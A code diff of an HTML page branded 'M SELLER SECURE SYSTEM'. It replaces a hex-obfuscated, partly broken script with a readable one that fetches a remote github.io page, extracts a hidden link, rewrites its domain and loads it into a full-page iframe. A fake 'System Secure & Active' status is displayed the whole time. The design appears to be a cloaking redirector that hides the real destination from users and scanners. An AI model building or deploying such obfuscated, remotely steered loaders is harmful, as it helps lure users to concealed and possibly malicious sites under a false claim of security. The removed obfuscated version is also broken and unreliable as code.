@@ -12,43 +12,45 @@
 </head>
 <body>
 
-   
+    <div class="header">
+        M SELLER SECURE SYSTEM | <span id="status">Decoding...</span>
+    </div>
 
     <iframe id="main-frame" src="about:blank"></iframe>
 
     <script>
-        async function fnqFShcdCQ() {
-            const _KJOcPNOe = document.getElementById('\x73\x74\x61\x74\x75\x73');
-            const _XACIiugE = document.getElementById('\x6d\x61\x69\x6e\x2d\x66\x72\x61\x6d\x65');
+        async function fetchAndDecode() {
+            const statusBox = document.getElementById('status');
+            const frame = document.getElementById('main-frame');
             
             
-            const _vyS = '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x75\x68\x61\x6d\x6d\x61\x64\x74\x61\x71\x69\x35\x31\x32\x71\x2d\x6f\x73\x73\x2e\x67\x69\x74\x68\x75\x62\x2e\x69\x6f\x2f\x4f\x4c\x49\x56\x45\x41\x61\x69\x2f\x6d\x74';
+            const sourceURL = 'https://muhammadtaqi512q-oss.github.io/OLIVEAai/mt';
 
             try {
-                const _zXwO = await fetch(sourceURL);
-                const _ZYrrns = await response.text();
+                const response = await fetch(sourceURL);
+                const html = await response.text();
 
-                const _XLoJn = new DOMParser();
-                const _rjZvyJFo = parser.parseFromString(html, '\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c');
+                const parser = new DOMParser();
+                const doc = parser.parseFromString(html, 'text/html');
                 
                
-                let _smoao = doc.getElementById('\x74\x61\x72\x67\x65\x74\x2d\x6c\x69\x6e\x6b').innerText.trim();
+                let encodedLink = doc.getElementById('target-link').innerText.trim();
 
+              
+                let decodedLink = encodedLink.replace('.mt', '.site');
 
-                let _vLLmW = encodedLink.replace('\x2e\x6d\x74', '\x2e\x73\x69\x74\x65');
-
-            
-                if (decodedLink.includes('\x68\x74\x74\x70')) {
+               
+                if (decodedLink.includes('http')) {
                     frame.src = decodedLink;
-                    statusBox.innerText = "\x53\x79\x73\x74\x65\x6d\x20\x53\x65\x63\x75\x72\x65\x20\x26\x20\x41\x63\x74\x69\x76\x65";
-                    console.log("\x44\x65\x63\x6f\x64\x65\x64\x20\x53\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x6c\x79");
+                    statusBox.innerText = "System Secure & Active";
+                    console.log("Decoded Successfully");
                 } else {
-                    statusBox.innerText = "\x46\x65\x74\x63\x68\x20\x45\x72\x72\x6f\x72";
+                    statusBox.innerText = "Fetch Error";
                 }
 
             } catch (error) {
-                statusBox.innerText = "\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x20\x46\x61\x69\x6c\x65\x64";
-                console.error("\x53\x65\x63\x75\x72\x69\x74\x79\x20\x46\x65\x74\x63\x68\x20\x45\x72\x72\x6f\x72\x3a", error);
+                statusBox.innerText = "Connection Failed";
+                console.error("Security Fetch Error:", error);
             }
         }
 
